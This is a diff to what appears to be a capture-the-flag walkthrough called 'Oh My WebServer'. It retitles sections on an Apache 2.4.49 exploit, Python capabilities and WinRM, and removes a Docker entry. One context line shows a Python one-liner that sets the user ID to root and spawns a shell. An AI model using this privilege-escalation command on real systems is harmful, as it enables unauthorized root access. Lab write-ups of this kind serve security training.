@@ -1,12 +1,11 @@
 # Oh My WebServer
 
-:white_check_mark:  [**Apache**](#apache)
+:white_check_mark:  [**Apache 2.4.49 exploit**](#apache)
 
-:white_check_mark: [**Capabilities(python)**](#capabilities)
+:white_check_mark: [**Python(capabilities)**](#capabilities)
 
-:white_check_mark: [**WinRM**](#win_rm)
+:white_check_mark: [**WinRM exploit**](#win_rm)
 
-:white_check_mark: [**Docker**](#docker)
 ___
 
 ## Enumeration
@@ -64,8 +63,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
-
-<a name="docker"></a>
 
 ## Docker escape
 
